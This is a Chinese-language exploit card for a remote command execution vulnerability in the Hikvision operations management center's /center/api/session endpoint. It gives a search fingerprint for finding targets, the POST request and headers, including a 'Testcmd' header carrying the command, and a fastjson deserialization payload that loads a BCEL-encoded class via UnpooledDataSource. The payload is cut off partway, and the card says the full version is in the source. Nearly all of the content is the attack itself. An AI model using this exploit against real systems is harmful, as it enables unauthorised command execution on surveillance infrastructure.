# 海康威视运行管理中心_center_api_session存在远程命令执行漏洞

- **系统**：海康　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.icon=="e05b47d5ce11d2f4182a964255870b76"`
- **请求**：`POST /center/api/session HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: application/json;charset=UTF-8`　`X-Language-Type: zh_CN`　`Testcmd: echo test`　`Content-Length: 5778`

**请求体 / payload**
```
{"x":{{"@type":"com.alibaba.fastjson.JSONObject","name":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource","key":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driver":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$…（脚本共 5778 字，完整版见原文）
```